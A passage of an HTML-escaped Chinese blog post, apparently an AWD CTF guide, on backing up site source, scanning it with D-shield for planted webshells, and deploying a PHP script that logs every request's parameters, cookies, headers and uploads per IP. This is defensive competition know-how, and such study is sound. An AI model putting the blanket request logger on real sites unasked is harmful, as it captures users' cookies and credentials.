    &lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34; [+] something like interesting!!! &#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/p&gt;
&lt;h2 id=&#34;下载源码备份&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#下载源码备份&#34;&gt;#&lt;/a&gt; 下载源码，备份&lt;/h2&gt;
&lt;p&gt;使用 ssh 工具保留源码，复制两份，用 d 盾去扫一份&lt;br /&gt;
以免网站崩溃的时候无法及时恢复，导致 check 丢分&lt;/p&gt;
&lt;h2 id=&#34;防御&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#防御&#34;&gt;#&lt;/a&gt; 防御&lt;/h2&gt;
&lt;p&gt;上面提到我们将源码 down 下来后利用 d 盾等工具扫描，将爆出来的 shell 注释修改或者删除等（具体怎么改根据比赛要求）&lt;/p&gt;
&lt;p&gt;接着就是监控脚本&lt;/p&gt;
&lt;p&gt;&lt;pre class=&#34;line-numbers language-php&#34; data-language=&#34;php&#34;&gt;&lt;code class=&#34;language-php&#34;&gt;&lt;span class=&#34;token php language-php&#34;&gt;&lt;span class=&#34;token delimiter important&#34;&gt;&amp;lt;?php&lt;/span&gt;

&lt;span class=&#34;token function&#34;&gt;error_reporting&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt; 
&lt;span class=&#34;token function&#34;&gt;define&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;LOG_FILEDIR&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;/tmp/loooooooogs&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;token comment&#34;&gt;// 日志文件目录&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;!&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;is_dir&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token constant&#34;&gt;LOG_FILEDIR&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;span class=&#34;token comment&#34;&gt;// 如果目录不存在则创建&lt;/span&gt;
	&lt;span class=&#34;token function&#34;&gt;mkdir&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token constant&#34;&gt;LOG_FILEDIR&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;token comment&#34;&gt;// 创建目录&lt;/span&gt;
&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;token function-definition function&#34;&gt;waf&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; 
&lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt; 
&lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;!&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;function_exists&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;getallheaders&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt; 
&lt;span class=&#34;token keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;token function-definition function&#34;&gt;getallheaders&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt; &lt;span class=&#34;token comment&#34;&gt;// 获取所有的头信息&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;foreach&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$_SERVER&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;as&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;$name&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&gt;&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;$value&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt; &lt;span class=&#34;token comment&#34;&gt;// 循环获取所有的头信息&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;substr&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$name&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;5&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;==&lt;/span&gt; &lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;HTTP_&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; 
&lt;span class=&#34;token variable&#34;&gt;$headers&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;str_replace&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39; &#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;-&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;ucwords&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;strtolower&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;str_replace&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;_&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39; &#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;substr&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$name&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;5&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;$value&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;token comment&#34;&gt;// 将头信息的名称替换为小写，并将下划线替换为空格&lt;/span&gt;
&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt; 
&lt;span class=&#34;token keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;$headers&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt; 
&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt; 
&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt; 
&lt;span class=&#34;token variable&#34;&gt;$get&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;$_GET&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;token comment&#34;&gt;// 获取 get 参数 &lt;/span&gt;
&lt;span class=&#34;token variable&#34;&gt;$post&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;$_POST&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;token comment&#34;&gt;// 获取 post 参数&lt;/span&gt;
&lt;span class=&#34;token variable&#34;&gt;$cookie&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;$_COOKIE&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;token comment&#34;&gt;// 获取 cookie 参数&lt;/span&gt;
&lt;span class=&#34;token variable&#34;&gt;$header&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;getallheaders&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;token comment&#34;&gt;// 获取所有的头信息&lt;/span&gt;
&lt;span class=&#34;token variable&#34;&gt;$files&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;$_FILES&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;token comment&#34;&gt;// 获取所有的上传文件信息&lt;/span&gt;
&lt;span class=&#34;token variable&#34;&gt;$ip&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;$_SERVER&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;REMOTE_ADDR&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;token comment&#34;&gt;// 获取客户端 ip&lt;/span&gt;
&lt;span class=&#34;token variable&#34;&gt;$method&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;$_SERVER&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;REQUEST_METHOD&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;token comment&#34;&gt;// 获取请求方式&lt;/span&gt;
&lt;span class=&#34;token variable&#34;&gt;$filepath&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;$_SERVER&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;SCRIPT_NAME&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;token comment&#34;&gt;// 获取文件路径&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;foreach&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$_FILES&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;as&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;$key&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&gt;&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;$value&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt; &lt;span class=&#34;token comment&#34;&gt;// 循环获取所有的上传文件信息&lt;/span&gt;
&lt;span class=&#34;token variable&#34;&gt;$files&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$key&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;content&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;file_get_contents&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$_FILES&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$key&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;tmp_name&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;token comment&#34;&gt;// 获取文件内容&lt;/span&gt;
&lt;span class=&#34;token function&#34;&gt;file_put_contents&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$_FILES&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$key&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;tmp_name&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;virink&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;token comment&#34;&gt;// 写入文件&lt;/span&gt;
&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;

&lt;span class=&#34;token keyword&#34;&gt;unset&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$header&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;Accept&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;token comment&#34;&gt;// 删除头信息中的 Accept&lt;/span&gt;
&lt;span class=&#34;token variable&#34;&gt;$input&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;array&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;Get&#34;&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&gt;&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$get&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;Post&#34;&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&gt;&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$post&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;Cookie&#34;&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&gt;&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$cookie&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;File&#34;&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&gt;&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$files&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;Header&#34;&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&gt;&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$header&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;token comment&#34;&gt;// 将所有的参数合并成一个数组&lt;/span&gt;

&lt;span class=&#34;token function&#34;&gt;logging&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$input&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;token comment&#34;&gt;// 调用日志函数&lt;/span&gt;

&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;

&lt;span class=&#34;token keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;token function-definition function&#34;&gt;logging&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$var&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt; &lt;span class=&#34;token comment&#34;&gt;// 日志函数&lt;/span&gt;
&lt;span class=&#34;token variable&#34;&gt;$filename&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;$_SERVER&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;REMOTE_ADDR&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;token comment&#34;&gt;// 获取客户端 ip&lt;/span&gt;
&lt;span class=&#34;token variable&#34;&gt;$LOG_FILENAME&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token constant&#34;&gt;LOG_FILEDIR&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;/&#34;&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$filename&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;token comment&#34;&gt;// 日志文件路径&lt;/span&gt;
&lt;span class=&#34;token variable&#34;&gt;$time&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;date&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;Y-m-d G:i:s&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;token comment&#34;&gt;// 获取当前时间&lt;/span&gt;
&lt;span class=&#34;token function&#34;&gt;file_put_contents&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$LOG_FILENAME&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;\r\n&#34;&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$time&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;\r\n&#34;&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;print_r&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$var&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token constant boolean&#34;&gt;true&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token constant&#34;&gt;FILE_APPEND&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;token comment&#34;&gt;// 写入日志文件&lt;/span&gt;

&lt;span class=&#34;token function&#34;&gt;file_put_contents&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$LOG_FILENAME&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;\r\n&#34;&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;http://&#39;&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$_SERVER&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;HTTP_HOST&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$_SERVER&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;PHP_SELF&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;?&#39;&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$_SERVER&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;QUERY_STRING&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token constant&#34;&gt;FILE_APPEND&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;token comment&#34;&gt;// 写入日志文件&lt;/span&gt;

